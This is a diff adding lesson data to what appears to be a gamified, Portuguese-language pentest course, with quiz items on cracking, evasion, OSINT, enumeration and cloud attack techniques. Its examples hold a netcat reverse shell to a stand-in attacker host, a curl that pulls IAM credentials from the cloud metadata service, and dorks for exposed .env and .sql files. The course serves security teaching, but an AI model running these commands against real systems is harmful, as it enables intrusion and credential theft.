+        "explanation": "CeWL (Custom Word List) spider o site e extrai palavras para criar dicionários personalizados."
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta → Tipo de Ataque",
+        "pairs": [
+          {
+            "term": "Hydra",
+            "definition": "Brute force online (rede)"
+          },
+          {
+            "term": "John the Ripper",
+            "definition": "Cracking offline (CPU)"
+          },
+          {
+            "term": "Hashcat",
+            "definition": "Cracking offline (GPU)"
+          },
+          {
+            "term": "CeWL",
+            "definition": "Geração de wordlist"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "10.2c-persist-evasion-tools.html",
+    "module": "10",
+    "title": "Ferramentas de Persistência e Evasão 10.2c",
+    "victory_msg": "EVASÃO E PERSISTÊNCIA DOMINADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-anchor",
+        "title": "10.2.9 Ferramentas de Persistência",
+        "content": "<b>Netcat</b>: 'canivete suíço' de rede (bind/reverse shells). <b>Ncat</b>: versão melhorada com SSL. <b>PowerShell Empire</b>: C2 framework. <b>Covenant</b>: C2 .NET. <b>Cobalt Strike</b>: C2 comercial premium.",
+        "highlight": "C2 = Command and Control — controle pós-exploração"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-tower-broadcast",
+        "title": "C2 Frameworks",
+        "content": "<b>C2 (Command & Control)</b> são frameworks que gerenciam múltiplos acessos comprometidos. Permitem <b>executar comandos</b>, <b>mover lateralmente</b>, <b>exfiltrar dados</b> e <b>pivotar</b> pela rede.",
+        "highlight": "C2 = painel de controle do atacante"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Reverse Shell com Netcat",
+        "scenario": "O atacante configura um listener Netcat e o alvo conecta de volta, estabelecendo uma shell reversa.",
+        "code": "# Atacante (listener):\nnc -lvnp 4444\n\n# Alvo (conexão reversa):\nnc -e /bin/bash atacante.com 4444",
+        "takeaway": "Reverse shells contornam firewalls que bloqueiam conexões de entrada."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual é a principal vantagem de uma reverse shell sobre uma bind shell?",
+        "options": [
+          "Contorna firewalls que bloqueiam conexões de entrada",
+          "É mais rápida",
+          "Não precisa de rede"
+        ],
+        "correctText": "Contorna firewalls que bloqueiam conexões de entrada",
+        "explanation": "Na reverse shell, o alvo inicia a conexão para fora, passando pelo firewall."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-eye-slash",
+        "title": "10.2.11 Ferramentas de Evasão",
+        "content": "<b>Veil</b>: gera payloads que evadem antivírus. <b>Shellter</b>: injeta shellcode em executáveis legítimos. <b>Msfvenom</b>: gera payloads com encoding. <b>ProxyChains</b>: roteia tráfego por proxies.",
+        "highlight": "Evasão = tornar o payload invisível ao AV"
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta → Função de Evasão",
+        "pairs": [
+          {
+            "term": "Veil",
+            "definition": "Gera payloads anti-antivírus"
+          },
+          {
+            "term": "Shellter",
+            "definition": "Injeta shellcode em .exe legítimos"
+          },
+          {
+            "term": "ProxyChains",
+            "definition": "Roteia tráfego por proxies"
+          },
+          {
+            "term": "Msfvenom",
+            "definition": "Gera e encoda payloads"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "10.2.13 Frameworks de Exploração",
+        "content": "<b>Metasploit Framework</b>: o maior framework (2000+ exploits). <b>BeEF</b>: exploração de browsers. <b>RouterSploit</b>: exploração de roteadores e IoT. <b>Exploit Pack</b>: GUI para exploração.",
+        "highlight": "Metasploit = o arsenal mais completo do pentester"
+      },
+      {
+        "type": "fill",
+        "sentence": "O framework que injeta shellcode em executáveis Windows legítimos para evadir antivírus é o ___.",
+        "options": [
+          "Shellter",
+          "Nmap",
+          "Burp Suite"
+        ],
+        "correctText": "Shellter",
+        "explanation": "Shellter modifica executáveis PE para incluir shellcode sem alterar sua funcionalidade aparente."
+      }
+    ]
+  },
+  {
+    "filename": "10.2d-forense-special-tools.html",
+    "module": "10",
+    "title": "Ferramentas Forenses e Especiais 10.2d",
+    "victory_msg": "TOOLKIT COMPLETO DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-microscope",
+        "title": "10.2.15 Descompilação e Debugging",
+        "content": "<b>Ghidra</b>: descompilador da NSA (gratuito). <b>IDA Pro</b>: disassembler comercial líder. <b>OllyDbg</b>: debugger Windows. <b>GDB</b>: debugger Linux. <b>Radare2</b>: framework de engenharia reversa.",
+        "highlight": "Engenharia reversa revela o que o código realmente faz"
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta → Uso",
+        "pairs": [
+          {
+            "term": "Ghidra",
+            "definition": "Descompilador gratuito (NSA)"
+          },
+          {
+            "term": "IDA Pro",
+            "definition": "Disassembler comercial líder"
+          },
+          {
+            "term": "GDB",
+            "definition": "Debugger Linux"
+          },
+          {
+            "term": "Radare2",
+            "definition": "Framework de eng. reversa"
+          }
+        ]
+      },
+      {
+        "type": "teach",
+        "icon": "fa-hard-drive",
+        "title": "10.2.17 Ferramentas Forenses",
+        "content": "<b>Autopsy</b>: análise forense de discos. <b>Volatility</b>: análise de memória RAM. <b>FTK Imager</b>: criação de imagens forenses. <b>Sleuth Kit</b>: análise de sistemas de arquivo.",
+        "highlight": "Forense digital = reconstruir o que aconteceu"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta analisa dumps de memória RAM para encontrar processos maliciosos?",
+        "options": [
+          "Volatility",
+          "Autopsy",
+          "Nmap"
+        ],
+        "correctText": "Volatility",
+        "explanation": "Volatility extrai processos, conexões, chaves de registro e malware da memória."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-check-double",
+        "title": "10.2.19 Garantia de Software",
+        "content": "<b>SonarQube</b>: análise estática de código. <b>Fortify</b>: SAST comercial. <b>OWASP ZAP</b>: DAST gratuito. <b>Bandit</b>: análise de segurança Python. <b>Semgrep</b>: análise estática moderna.",
+        "highlight": "SAST = código. DAST = app rodando."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-wifi",
+        "title": "10.2.21 Ferramentas Wireless",
+        "content": "<b>Aircrack-ng</b>: suite completa WiFi. <b>Kismet</b>: detector de redes wireless. <b>Wifite</b>: automação de ataques WiFi. <b>Fern WiFi Cracker</b>: GUI para ataques wireless.",
+        "highlight": "Aircrack-ng = suite padrão para hacking WiFi"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-image",
+        "title": "10.2.23 Esteganografia",
+        "content": "<b>Steghide</b>: esconde dados em imagens JPEG. <b>OpenStego</b>: esteganografia multiplataforma. <b>Stegsolve</b>: análise visual de esteganografia. <b>Binwalk</b>: extrai dados embutidos em arquivos.",
+        "highlight": "Esteganografia = esconder dados em arquivos inocentes"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-cloud",
+        "title": "10.2.25 Ferramentas de Nuvem",
+        "content": "<b>ScoutSuite</b>: auditoria multi-cloud (AWS/Azure/GCP). <b>Prowler</b>: segurança AWS. <b>CloudSploit</b>: scanner de misconfiguration. <b>Pacu</b>: framework de exploração AWS.",
+        "highlight": "Cada provedor cloud tem ferramentas específicas"
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta Cloud → Uso",
+        "pairs": [
+          {
+            "term": "ScoutSuite",
+            "definition": "Auditoria multi-cloud"
+          },
+          {
+            "term": "Prowler",
+            "definition": "Segurança AWS"
+          },
+          {
+            "term": "Pacu",
+            "definition": "Exploração AWS"
+          },
+          {
+            "term": "CloudSploit",
+            "definition": "Scanner de misconfiguration"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta gratuita de descompilação criada pela NSA é o ___.",
+        "options": [
+          "Ghidra",
+          "IDA Pro",
+          "OllyDbg"
+        ],
+        "correctText": "Ghidra",
+        "explanation": "Ghidra foi liberado pela NSA como open source em 2019 e rivaliza com o IDA Pro."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta esconde dados dentro de imagens JPEG?",
+        "options": [
+          "Steghide",
+          "Wireshark",
+          "Nmap"
+        ],
+        "correctText": "Steghide",
+        "explanation": "Steghide embute dados em imagens JPEG e áudio AU sem alteração visual perceptível."
+      }
+    ]
+  },
+  {
+    "filename": "3.1a-osint-busca.html",
+    "module": "3",
+    "title": "OSINT e Buscas 3.1a",
+    "victory_msg": "OSINT DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-globe",
+        "title": "OSINT Overview",
+        "content": "<b>OSINT</b> coleta informações de fontes públicas: <b>motores de busca</b>, <b>redes sociais</b>, <b>registros DNS</b>, <b>WHOIS</b>, <b>certificados TLS</b>, <b>documentos vazados</b> e <b>metadados de arquivos</b>.",
+        "highlight": "Fontes públicas = mina de ouro"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-search",
+        "title": "Google Dorking Avançado",
+        "content": "Operadores: <b>site:</b> (domínio), <b>filetype:</b> (formato), <b>inurl:</b> (URL), <b>intitle:</b> (título), <b>intext:</b> (conteúdo), <b>cache:</b> (versão em cache). Combinações potencializam resultados.",
+        "highlight": "Google Dorks revelam dados que não deveriam ser públicos"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Dorks para Pentest",
+        "scenario": "Buscando arquivos sensíveis expostos em um domínio alvo.",
+        "code": "site:alvo.com filetype:sql\nsite:alvo.com filetype:env\nsite:alvo.com inurl:admin\nsite:alvo.com intitle:\"index of\"",
+        "takeaway": "Combine operadores para buscas cirúrgicas."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-address-card",
+        "title": "WHOIS e DNS Enumeration",
+        "content": "<b>WHOIS</b>: proprietário, e-mails, nameservers. <b>dig/nslookup</b>: registros A, MX, NS, TXT. <b>Zone Transfer</b> (AXFR): se permitido, revela TODOS os registros DNS de uma zona.",
+        "highlight": "Zone Transfer = mapa completo do DNS"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "DNS Zone Transfer",
+        "scenario": "Tentando um zone transfer contra o nameserver do alvo para obter todos os registros DNS.",
+        "code": "dig axfr alvo.com @ns1.alvo.com",
+        "takeaway": "Zone transfers mal configurados expõem toda a infraestrutura DNS."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual consulta DNS revela TODOS os registros de uma zona se estiver mal configurada?",
+        "options": [
+          "Zone Transfer (AXFR)",
+          "Reverse DNS",
+          "DNS over HTTPS"
+        ],
+        "correctText": "Zone Transfer (AXFR)",
+        "explanation": "AXFR transfere todos os registros DNS de uma zona — deve ser restrito apenas a servidores secundários."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-certificate",
+        "title": "Certificate Transparency",
+        "content": "<b>CT Logs</b> registram todos os certificados TLS emitidos. Ferramentas como <b>crt.sh</b> permitem descobrir subdomínios a partir dos certificados registrados.",
+        "highlight": "Certificados TLS revelam subdomínios ocultos"
+      },
+      {
+        "type": "fill",
+        "sentence": "A plataforma ___ permite descobrir subdomínios a partir de logs de Certificate Transparency.",
+        "options": [
+          "crt.sh",
+          "Google",
+          "Facebook"
+        ],
+        "correctText": "crt.sh",
+        "explanation": "crt.sh indexa certificados TLS públicos e lista todos os domínios/subdomínios associados."
+      }
+    ]
+  },
+  {
+    "filename": "3.1b-osint-ferramentas.html",
+    "module": "3",
+    "title": "Ferramentas OSINT 3.1b",
+    "victory_msg": "TOOLKIT OSINT DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-toolbox",
+        "title": "Recon-ng",
+        "content": "<b>Recon-ng</b> é um framework OSINT modular (similar ao Metasploit). Possui módulos para <b>WHOIS</b>, <b>DNS</b>, <b>harvesting de e-mails</b>, <b>busca de subdomínios</b> e <b>geolocalização</b>.",
+        "highlight": "Recon-ng = Metasploit do OSINT"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-envelope",
+        "title": "theHarvester",
+        "content": "<b>theHarvester</b> coleta <b>e-mails</b>, <b>nomes</b>, <b>subdomínios</b>, <b>IPs</b> e <b>URLs</b> de fontes públicas (Google, Bing, LinkedIn, Shodan, Hunter.io).",
+        "highlight": "theHarvester = coleta massiva de intel"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "theHarvester em Ação",
+        "scenario": "Coletando e-mails e subdomínios do domínio alvo usando múltiplas fontes.",
+        "code": "theHarvester -d alvo.com -b google,bing,linkedin -l 500",
+        "takeaway": "Combine múltiplas fontes para máxima cobertura."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-lines",
+        "title": "Metadata Analysis",
+        "content": "Documentos (PDF, DOCX, XLSX) contêm <b>metadados</b>: autor, software, datas, caminhos de rede internos. <b>Exiftool</b> e <b>FOCA</b> extraem essas informações.",
+        "highlight": "Metadados revelam infraestrutura interna"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Exiftool para Metadados",
+        "scenario": "Extraindo metadados de um PDF público encontrado no site do alvo.",
+        "code": "exiftool documento.pdf\n# Revela: Author, Creator (software), Create Date, internal paths",
+        "takeaway": "Metadados podem revelar usernames, software e caminhos internos."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-database",
+        "title": "Shodan e Censys",
+        "content": "<b>Shodan</b>: indexa servidores, câmeras, IoT. <b>Censys</b>: foca em certificados e serviços TLS. Ambos permitem buscar dispositivos do alvo sem enviar pacotes.",
+        "highlight": "Buscar dispositivos sem tocar no alvo"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-users",
+        "title": "LinkedIn e Redes Sociais",
+        "content": "<b>LinkedIn</b>: vagas revelam tecnologias, perfis revelam hierarquia. <b>Hunter.io</b>: encontra padrões de e-mail. <b>Maltego</b>: visualiza relações entre entidades.",
+        "highlight": "Pessoas revelam mais do que imaginam"
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta OSINT → Função",
+        "pairs": [
+          {
+            "term": "Recon-ng",
+            "definition": "Framework modular de OSINT"
+          },
+          {
+            "term": "theHarvester",
+            "definition": "E-mails e subdomínios"
+          },
+          {
+            "term": "Exiftool",
+            "definition": "Metadados de documentos"
+          },
+          {
+            "term": "FOCA",
+            "definition": "Metadados + fingerprinting"
+          },
+          {
+            "term": "Maltego",
+            "definition": "Visualização de relações"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta extrai metadados (autor, software, paths) de documentos como PDF e DOCX?",
+        "options": [
+          "Exiftool",
+          "Nmap",
+          "SQLMap"
+        ],
+        "correctText": "Exiftool",
+        "explanation": "Exiftool lê/escreve metadados em 300+ formatos de arquivo."
+      },
+      {
+        "type": "fill",
+        "sentence": "O framework OSINT modular que funciona de forma similar ao Metasploit é o ___.",
+        "options": [
+          "Recon-ng",
+          "Shodan",
+          "theHarvester"
+        ],
+        "correctText": "Recon-ng",
+        "explanation": "Recon-ng tem módulos carregáveis, workspaces e banco de dados, similar ao Metasploit."
+      }
+    ]
+  },
+  {
+    "filename": "10.1a-fundamentos-script.html",
+    "module": "10",
+    "title": "Fundamentos de Script 10.1a",
+    "victory_msg": "FUNDAMENTOS DE SCRIPT DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-code",
+        "title": "10.1.2 Construções Lógicas",
+        "content": "Construções essenciais para scripts: <b>if/else</b> (condicionais), <b>for/while</b> (loops), <b>try/except</b> (tratamento de erros). Todo script de pentest usa essas construções.",
+        "highlight": "Lógica = fundamento de todo script"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-database",
+        "title": "10.1.4 Estruturas de Dados",
+        "content": "<b>Listas</b>: coleção ordenada (IPs, portas). <b>Dicionários</b>: pares chave-valor (host→vulnerabilidades). <b>Sets</b>: valores únicos (eliminar duplicatas).",
+        "highlight": "Estrutura certa = código eficiente"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-puzzle-piece",
+        "title": "10.1.6 Bibliotecas",
+        "content": "Bibliotecas estendem a funcionalidade: <b>import requests</b> (HTTP), <b>import socket</b> (rede), <b>import os</b> (sistema). Sem bibliotecas, tudo seria reinventado do zero.",
+        "highlight": "Bibliotecas = atalhos para funcionalidades complexas"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-gears",
+        "title": "10.1.7-9 Funções e Classes",
+        "content": "<b>Procedimentos</b>: blocos de código reutilizáveis. <b>Funções</b>: procedimentos que retornam valor. <b>Classes</b>: agrupam dados + comportamento (OOP).",
+        "highlight": "Funções = modularidade. Classes = organização."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual estrutura de dados Python é ideal para armazenar pares IP→vulnerabilidade?",
+        "options": [
+          "Dicionário",
+          "Lista",
+          "String"
+        ],
+        "correctText": "Dicionário",
+        "explanation": "Dicionários permitem acessar dados por chave (IP) ao invés de índice numérico."
+      },
+      {
+        "type": "fill",
+        "sentence": "Para importar funcionalidade HTTP em Python, usamos ___.",
+        "options": [
+          "import requests",
+          "import nmap",
+          "import metasploit"
+        ],
+        "correctText": "import requests",
+        "explanation": "A biblioteca requests é o padrão para requisições HTTP em Python."
+      }
+    ]
+  },
+  {
+    "filename": "10.1b-linguagens-pratica.html",
+    "module": "10",
+    "title": "Linguagens e Prática 10.1b",
+    "victory_msg": "LINGUAGENS DE PENTEST DOMINADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-terminal",
+        "title": "10.1.12 Bash Scripting",
+        "content": "<b>Bash</b> é a cola entre ferramentas Linux. Automatiza: varreduras em massa, parsing de saída, enumeração de hosts. Essencial para qualquer pentester em Linux.",
+        "highlight": "Bash = automação nativa do Linux"
+      },
+      {
+        "type": "example",
+        "icon": "fa-code",
+        "title": "Scan em Massa com Bash",
+        "scenario": "Script que varre uma subnet inteira e salva hosts com portas abertas.",
+        "code": "#!/bin/bash\nfor ip in $(seq 1 254); do\n  (ping -c1 -W1 192.168.1.$ip > /dev/null 2>&1 && echo \"192.168.1.$ip UP\") &\ndone\nwait",
+        "takeaway": "Bash com & (background) paraleliza tarefas."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-snake",
+        "title": "10.1.13 Python para Pentest",
+        "content": "<b>Python</b> é a linguagem nº1: <b>requests</b> (web), <b>scapy</b> (pacotes), <b>pwntools</b> (exploits), <b>impacket</b> (Windows/AD), <b>paramiko</b> (SSH), <b>beautifulsoup</b> (parsing HTML).",
+        "highlight": "Python = canivete suíço do pentester"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-windows",
+        "title": "10.1.15 PowerShell para AD",
+        "content": "<b>PowerShell</b> domina ambientes Windows/AD: <b>Get-ADUser</b>, <b>Invoke-Command</b>, <b>Download cradle</b>. Também é usado ofensivamente: <b>PowerView</b>, <b>PowerUp</b>, <b>Invoke-Mimikatz</b>.",
+        "highlight": "PowerShell = ferramenta #1 para atacar AD"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-gem",
+        "title": "10.1.14 Ruby",
+        "content": "<b>Ruby</b> é a linguagem do <b>Metasploit Framework</b>. Escrever módulos Metasploit requer Ruby. Também usado em ferramentas como <b>WPScan</b> e <b>BeEF</b>.",
+        "highlight": "Ruby = linguagem do Metasploit"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-js",
+        "title": "10.1.17 JavaScript",
+        "content": "<b>JavaScript</b> é essencial para ataques web: <b>XSS payloads</b>, <b>DOM manipulation</b>, <b>WebSocket hijacking</b>. Node.js expande para server-side.",
+        "highlight": "JS = linguagem dos ataques web client-side"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-code",
+        "title": "10.1.10 Análise de Código",
+        "content": "Saber <b>ler e entender</b> código de exploits é tão importante quanto saber escrever. Identifique: <b>CVE alvo</b>, <b>vetor de ataque</b>, <b>payload</b>, <b>condições de sucesso</b>.",
+        "highlight": "Leia o exploit ANTES de executar"
+      },
+      {
+        "type": "match",
+        "title": "Linguagem → Uso Principal",
+        "pairs": [
+          {
+            "term": "Python",
+            "definition": "Scripts, exploits, automação geral"
+          },
+          {
+            "term": "Bash",
+            "definition": "Automação Linux, cola de ferramentas"
+          },
+          {
+            "term": "PowerShell",
+            "definition": "Ataques AD e automação Windows"
+          },
+          {
+            "term": "Ruby",
+            "definition": "Módulos Metasploit"
+          },
+          {
+            "term": "JavaScript",
+            "definition": "XSS e ataques client-side"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual linguagem é usada para escrever módulos do Metasploit Framework?",
+        "options": [
+          "Ruby",
+          "Python",
+          "C++"
+        ],
+        "correctText": "Ruby",
+        "explanation": "Metasploit é escrito em Ruby e seus módulos de exploit também são em Ruby."
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta PowerShell usada para enumerar Active Directory é o ___.",
+        "options": [
+          "PowerView",
+          "PowerPoint",
+          "PowerBI"
+        ],
+        "correctText": "PowerView",
+        "explanation": "PowerView (parte do PowerSploit) enumera usuários, grupos, trusts e shares do AD."
+      }
+    ]
+  },
+  {
+    "filename": "3.2a-recon-ativo-rede.html",
+    "module": "3",
+    "title": "Recon Ativo de Rede 3.2a",
+    "victory_msg": "VARREDURA DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-satellite-dish",
+        "title": "Reconhecimento Ativo",
+        "content": "Ao contrário do OSINT, no recon ativo <b>enviamos pacotes diretamente ao alvo</b>. Deixa rastros em firewalls e IDS/IPS. Objetivos: descobrir IPs vivos, portas abertas e serviços.",
+        "highlight": "Recon ativo = interação direta com o alvo"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-network-wired",
+        "title": "Ping Sweeps e Port Scans",
+        "content": "<b>Ping Sweep</b> (ex: nmap -sn) descobre quais IPs estão online. <b>Port Scan</b> descobre quais portas TCP/UDP estão abertas. TCP Connect (completo) vs TCP SYN (stealth).",
+        "highlight": "Ping Sweep = mapa da rede. Port Scan = mapa do host."
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "TCP SYN Scan vs Connect",
+        "scenario": "O pentester escolhe o SYN scan para ser mais discreto, enviando apenas o primeiro pacote do handshake (SYN).",
+        "code": "# TCP SYN Scan (Stealth, requer root)\nnmap -sS 192.168.1.100\n\n# TCP Connect Scan (Completo, sem root)\nnmap -sT 192.168.1.100",
+        "takeaway": "SYN Scan interrompe o handshake, gerando menos logs no servidor alvo."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual tipo de scan interrompe o handshake TCP antes de completar, gerando menos logs na aplicação alvo?",
+        "options": [
+          "TCP SYN Scan",
+          "TCP Connect Scan",
+          "UDP Scan"
+        ],
+        "correctText": "TCP SYN Scan",
+        "explanation": "O SYN scan (half-open) envia SYN, recebe SYN/ACK e responde com RST, interrompendo a conexão."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-fingerprint",
+        "title": "Service & OS Fingerprinting",
+        "content": "Descobrir que a porta 80 está aberta não basta. Precisamos saber <b>qual serviço</b> (Apache, Nginx) e <b>qual versão</b> está rodando. Nmap faz isso com -sV e adivinha o SO com -O.",
+        "highlight": "Saber a versão exata = encontrar exploits exatos"
+      },
+      {
+        "type": "fill",
+        "sentence": "Para que o Nmap tente identificar a versão exata dos serviços rodando nas portas abertas, usamos a flag ___.",
+        "options": [
+          "-sV",
+          "-sn",
+          "-O"
+        ],
+        "correctText": "-sV",
+        "explanation": "-sV (Service Version) analisa os banners e respostas dos serviços para identificar o software e versão."
+      }
+    ]
+  },
+  {
+    "filename": "3.2b-enumeracao-servicos.html",
+    "module": "3",
+    "title": "Enumeração de Serviços 3.2b",
+    "victory_msg": "ENUMERAÇÃO DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-folder-open",
+        "title": "Enumeração SMB e RPC",
+        "content": "<b>SMB</b> (porta 445/139) é essencial no Windows. Pode revelar pastas compartilhadas, usuários, políticas de senha e domínios. Ferramentas: <b>enum4linux</b>, <b>smbclient</b>, <b>crackmapexec</b>.",
+        "highlight": "SMB = mina de ouro em redes Windows"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Listando Shares Nulos",
+        "scenario": "Um share mal configurado permite acesso anônimo (Null Session) para listar diretórios.",
+        "code": "smbclient -L \\\\192.168.1.100 -N",
+        "takeaway": "-N instrui o smbclient a não usar senha (Null Session)."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-walkie-talkie",
+        "title": "SNMP Walking",
+        "content": "<b>SNMP</b> (porta 161 UDP) monitora dispositivos de rede. Se a 'community string' pública for padrão ('public' ou 'private'), um atacante pode extrair routing tables, processos e interfaces usando <b>snmpwalk</b>.",
+        "highlight": "SNMP revela configurações internas de roteadores e switches"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual protocolo de rede, frequentemente executado na porta UDP 161, pode vazar informações críticas do sistema se usar a community string 'public'?",
+        "options": [
+          "SNMP",
+          "SMB",
+          "DNS"
+        ],
+        "correctText": "SNMP",
+        "explanation": "SNMP (Simple Network Management Protocol) é usado para monitoramento e controle de dispositivos de rede."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-envelope",
+        "title": "Enumeração SMTP",
+        "content": "Servidores de e-mail (SMTP - porta 25) podem confirmar se um usuário existe usando os comandos <b>VRFY</b> (Verify) e <b>EXPN</b> (Expand). Ferramenta: <b>smtp-user-enum</b>.",
+        "highlight": "VRFY permite descobrir usuários válidos antes de tentar senhas"
+      },
+      {
+        "type": "match",
+        "title": "Serviço → Protocolo/Porta",
+        "pairs": [
+          {
+            "term": "SMB",
+            "definition": "TCP 445 / 139 (Compartilhamento)"
+          },
+          {
+            "term": "SNMP",
+            "definition": "UDP 161 (Monitoramento)"
+          },
+          {
+            "term": "SMTP",
+            "definition": "TCP 25 (E-mail)"
+          },
+          {
+            "term": "DNS",
+            "definition": "UDP/TCP 53 (Nomes)"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "7.1a-vetores-nuvem.html",
+    "module": "7",
+    "title": "Vetores na Nuvem 7.1a",
+    "victory_msg": "CLOUD SECURITY INICIADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-cloud",
+        "title": "Nuvem: Modelo de Responsabilidade",
+        "content": "A segurança na nuvem é <b>compartilhada</b>. O provedor (AWS, Azure) protege a <i>infraestrutura da nuvem</i>. O cliente protege o que coloca <i>dentro da nuvem</i> (dados, IAM, SO).",
+        "highlight": "O provedor não vai consertar o seu S3 aberto"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-folder-open",
+        "title": "Storage Misconfigurations",
+        "content": "Buckets S3 (AWS) ou Blobs (Azure) abertos ao público são a causa #1 de vazamentos na nuvem. Um bucket configurado sem restrições de acesso lista todo o seu conteúdo.",
+        "highlight": "S3 bucket público = desastre iminente"
+      },
+      {
+        "type": "quiz",
+        "task": "No modelo de responsabilidade compartilhada da nuvem (IaaS), quem é responsável por garantir que um bucket S3 não seja público?",
+        "options": [
+          "O Cliente",
+          "O Provedor da Nuvem",
+          "O Auditor"
+        ],
+        "correctText": "O Cliente",
+        "explanation": "A configuração de acesso e permissões aos dados criados (como S3) é responsabilidade do cliente."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-key",
+        "title": "Gerenciamento de Identidade (IAM)",
+        "content": "Na nuvem, <b>IAM é o novo perímetro</b>. Permissões excessivas (Over-privileged) permitem que um atacante que comprometa uma aplicação web ganhe controle de toda a conta AWS.",
+        "highlight": "Least Privilege é crucial no IAM"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-server",
+        "title": "Metadata Service (IMDS)",
+        "content": "Instâncias na nuvem podem acessar metadados internos via um IP especial (ex: <b>169.254.169.254</b>). Se a aplicação tiver uma falha <b>SSRF</b>, o atacante acessa esse IP e rouba credenciais temporárias do IAM da instância.",
+        "highlight": "SSRF + IMDS = chaves da conta AWS"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Roubando Credenciais via IMDS",
+        "scenario": "Atacante usa uma vulnerabilidade na aplicação web (SSRF) para forçar o servidor a ler suas próprias credenciais temporárias.",
+        "code": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
+        "takeaway": "O IMDSv2 adiciona autenticação por token para mitigar isso."
+      }
+    ]
+  },
+  {
+    "filename": "7.1b-cloud-exploits.html",
+    "module": "7",
+    "title": "Exploração e Enumeração Cloud 7.1b",
+    "victory_msg": "CLOUD EXPLOITATION DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-bolt",
+        "title": "Serverless (Lambda/Functions)",
+        "content": "Funções Serverless executam código sob demanda, sem servidor fixo. Falhas comuns: <b>Event Injection</b>, <b>dependências vulneráveis</b>, permissões IAM excessivas e vazamento de segredos em variáveis de ambiente.",
+        "highlight": "Sem servidor != Sem vulnerabilidades"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-magnifying-glass",
+        "title": "Cloud Enumeration",
+        "content": "Ferramentas como <b>ScoutSuite</b> e <b>Prowler</b> auditam a nuvem, mas para ataques, usamos <b>Pacu</b>. Ele enumera permissões (WhoAmI), encontra buckets abertos e tenta escalar privilégios (ex: criar um usuário admin).",
+        "highlight": "Pacu = Metasploit para AWS"
+      },
+      {
+        "type": "match",
+        "title": "Termo Cloud → Definição",
+        "pairs": [
+          {
+            "term": "IAM",
+            "definition": "Gerenciamento de Identidade e Acesso"
+          },
+          {
+            "term": "IMDS",
+            "definition": "Serviço de metadados da instância"
+          },
+          {
+            "term": "Serverless",
+            "definition": "Execução de código sem gerenciar servidor"
+          },
+          {
+            "term": "S3 / Blob",
+            "definition": "Armazenamento de objetos"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "O IP de endereço de link local padrão usado para acessar o Instance Metadata Service (IMDS) em nuvens públicas é ___.",
+        "options": [
+          "169.254.169.254",
+          "192.168.1.1",
+          "127.0.0.1"
+        ],
+        "correctText": "169.254.169.254",
